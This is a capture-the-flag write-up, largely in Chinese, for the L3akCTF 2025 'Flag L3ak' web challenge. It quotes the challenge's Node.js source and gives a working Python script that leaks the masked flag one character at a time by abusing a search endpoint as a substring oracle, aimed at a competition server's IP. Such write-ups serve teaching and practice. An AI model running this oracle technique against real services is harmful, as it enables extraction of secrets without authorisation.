# L3akCTF - 2025
###### Contributed by @CXPhoenix

## Flag L3ak - Web

> [!NOTE]
> Value: 50
>
> Author p._.k
>
> Attachments: [flag_l3ak.zip](https://drive.google.com/uc?export=download&id=1fc36MFcJhjfVmeUkujgBnIfV1n0YbuRj)

### Description
What's the name of this CTF? Yk what to do 😉

### Solution

此題目很有趣，提供了原始碼，然後你就會看到他的 flag 放在 `id=3` 的 posts 陣列中。

```js
const posts = [
    {
        id: 1,
        title: "Welcome to our blog!",
        content: "This is our first post. Welcome everyone!",
        author: "admin",
        date: "2025-01-15"
    },
    {
        id: 2,
        title: "Tech Tips",
        content: "Here are some useful technology tips for beginners. Always keep your software updated!",
        author: "Some guy out there",
        date: "2025-01-20"
    },
    {
        id: 3,
        title: "Not the flag?",
        content: `Well luckily the content of the flag is hidden so here it is: ${FLAG}`,
        author: "admin",
        date: "2025-05-13"
    },
    {
        id: 4,
        title: "Real flag fr",
        content: `Forget that other flag. Here is a flag: L3AK{Bad_bl0g?}`,
        author: "L3ak Member",
        date: "2025-06-13"
    },
    {
        id: 5,
        title: "Did you know?",
        content: "This blog post site is pretty dope, right?",
        author: "???",
        date: "2025-06-20"
    },
];
```

原本想說：恩，真佛心來著 ❤️，但往下一看...

```js
app.get('/api/posts', (_, res) => {
    const publicPosts = posts.map(post => ({
        id: post.id,
        title: post.title,
        content: post.content.replace(FLAG, '*'.repeat(FLAG.length)),
        author: post.author,
        date: post.date
    }));
    
    res.json({
        posts: publicPosts,
        total: publicPosts.length
    });
});
```

果然這世界不是憨人想的這麼簡單... ｡ﾟヽ(ﾟ´Д`)ﾉﾟ｡

他的 FLAG 會先進行取代，最後才輸出。

不過，也沒有灰心，因為往上一 🐈 ，就看到了 search 功能：

```js
app.post('/api/search', (req, res) => {
    const { query } = req.body;
    
    if (!query || typeof query !== 'string' || query.length !== 3) {
        return res.status(400).json({ 
            error: 'Query must be 3 characters.',
        });
    }

    const matchingPosts = posts
        .filter(post => 
            post.title.includes(query) ||
            post.content.includes(query) ||
            post.author.includes(query)
        )
        .map(post => ({
            ...post,
            content: post.content.replace(FLAG, '*'.repeat(FLAG.length))
    }));

    res.json({
        results: matchingPosts,
        count: matchingPosts.length,
        query: query
    });
});
```

這段很有趣，因為他並沒有擋住搜尋 FLAG ，而是只是擋輸出結果，

這樣擋不住「近似法」的攻擊。

因此判定為妥妥的 Blind 攻擊。但這因為不是 SQL，所以就叫他 `Substring-based Oracle` 吧 ξ( ✿＞◡❛)▄︻▇▇〓▄︻┻┳═一

因此寫了這段 Code：

```python
import requests
import string
from tqdm import tqdm
from colorist import Color, Effect

TARGET = "http://34.134.162.213:17000/api/search"
FLAG_LEN = 24

flag = "L3AK{"

pointer = len(flag)-2
char_list = string.printable
while True:
    q = flag[pointer:] # lenght 理論上只有 2
    print(f"[*] Now we test with {Effect.UNDERLINE}{q}{Effect.UNDERLINE_OFF}*...")
    for char in tqdm(char_list):
        resp = requests.post(TARGET, json={"query": q+char})
        data = resp.json()
        targ = [d for d in data.get('results', []) if d.get('id') == 3]
        if targ:
            print(f"{Color.GREEN}[+] find flag char '{Effect.BOLD}{char}{Effect.BOLD_OFF}' !{Color.OFF}")
            flag += char
            print(f"[*] flag is {flag}")
            pointer += 1
            break
    else:
        print(f"{Color.RED}[-] Can't find from {Effect.UNDERLINE}{char_list}{Effect.UNDERLINE_OFF}...{Color.OFF}")
        print(f"{Color.RED}[*] Stopping...{Color.OFF}")
        break
    if char == "}":
        print(f"{Color.GREEN}[+] Found full flag!{Color.OFF}")
        break
print()
print(f"[*] result is {Effect.UNDERLINE}{flag}{Effect.UNDERLINE_OFF}")
```

---

## Referenece

* [Blind SQL Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/#blind-injection)